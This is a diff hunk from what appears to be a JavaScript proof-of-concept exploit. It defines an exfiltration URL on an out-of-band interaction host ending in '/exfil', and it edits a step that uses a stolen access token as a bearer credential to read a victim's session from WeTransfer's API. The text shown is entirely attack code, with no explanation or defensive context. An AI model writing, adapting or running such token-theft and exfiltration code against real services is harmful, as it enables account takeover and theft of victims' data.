@@ -20,7 +20,7 @@ const EXFIL_URL = 'https://0jik82y5uzt15l0l8n1yaw137185g83b0.oast.site/exfil';
 
     // Step 2: Use stolen token to read victim's account data
     if (tokenData.access_token) {
-      const sessionResp = await fetch('/api/v4/auth/session', {
+      const sessionResp = await fetch('https://wetransfer.com/api/v4/auth/session', {
         headers: { 'Authorization': 'Bearer ' + tokenData.access_token }
       });
       results.session = { status: sessionResp.status, body: await sessionResp.json() };
